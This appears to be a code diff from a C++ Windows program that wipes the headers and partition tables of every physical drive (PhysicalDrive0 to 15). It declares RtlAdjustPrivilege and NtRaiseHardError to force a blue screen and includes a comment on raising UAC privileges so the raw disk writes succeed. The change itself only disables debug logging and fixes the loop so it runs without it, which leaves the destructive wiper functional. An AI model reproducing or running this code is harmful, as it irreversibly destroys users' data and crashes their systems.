@@ -11,7 +11,7 @@
 //Note: Modify Linker->Manifest File->UAC Execution level in project settings if you want the PhysicalDrive accesses to go through when executing
 
 #define BSOD
-#define DEBUG_LOG
+//#define DEBUG_LOG
 
 extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
 extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
@@ -204,8 +204,9 @@ int main()
 
     for (int i = 0; i < 16; i++)
     {
-#ifdef DEBUG_LOG
         std::wstring curDsk = physDskName + std::to_wstring(i);
+#ifdef DEBUG_LOG
+        
         std::wcout << curDsk << L"\n";
 #endif
         WipeHeadersAndTables(curDsk.c_str());
